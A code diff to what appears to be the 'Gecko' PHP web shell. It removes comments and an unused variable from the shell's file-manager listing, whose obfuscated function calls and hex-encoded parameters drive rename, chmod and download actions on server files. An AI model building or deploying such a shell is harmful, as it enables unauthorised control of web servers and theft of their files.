@@ -817,7 +817,6 @@ if ($_GET['don'] == true) {
             </thead>
             <form action="" method="post">
                 <tbody>
-                    <!-- Gecko Folder File Manager -->
                     <?php foreach ($file_manager as $_D) : ?>
                         <?php if ($fungsi[2]($_D)) : ?>
                             <tr>
@@ -832,12 +831,10 @@ if ($_GET['don'] == true) {
                                     echo perms($fungsi[0]() . '/' . $_D);
                                     ?>
                                 </td>
-                                <!-- Action Folder Manager -->
                                 <td><a href="?d=<?= hx($fungsi[0]()); ?>&re=<?= hx($_D) ?>" class="badge-action-editor"><i class="fa-solid fa-pen-to-square"></i></a>&nbsp;<a href="?d=<?= hx($fungsi[0]()); ?>&ch=<?= hx($_D) ?>" class="badge-action-chmod"><i class="fa-solid fa-user-pen"></i></a></td>
                             </tr>
                         <?php endif; ?>
                     <?php endforeach; ?>
-                    <!-- Gecko Files Manager -->
                     <?php foreach ($file_manager as $_F) : ?>
                         <?php if ($fungsi[3]($_F)) : ?>
                             <tr>
@@ -852,7 +849,6 @@ if ($_GET['don'] == true) {
                                     echo perms($fungsi[0]() . '/' . $_F);
                                     ?>
                                 </td>
-                                <!-- Action File Manager -->
                                 <td><a href="?d=<?= hx($fungsi[0]()); ?>&re=<?= hx($_F) ?>" class="badge-action-editor"><i class="fa-solid fa-pen-to-square"></i></a>&nbsp;<a href="?d=<?= hx($fungsi[0]()); ?>&ch=<?= hx($_F) ?>" class="badge-action-chmod"><i class="fa-solid fa-user-pen"></i></a>&nbsp;<a href="?d=<?= hx($fungsi[0]()); ?>&don=<?= hx($_F) ?>" class="badge-action-download"><i class="fa-solid fa-download"></i></a></td>
                             </tr>
                         <?php endif; ?>
@@ -1771,7 +1767,6 @@ function windowsDriver()
 function namaPanjang($value)
 {
     $namaNya = $value;
-    $extensi = pathinfo($value, PATHINFO_EXTENSION);
     if (strlen($namaNya) > 30) {
         return substr($namaNya, 0, 30) . "...";
     } else {
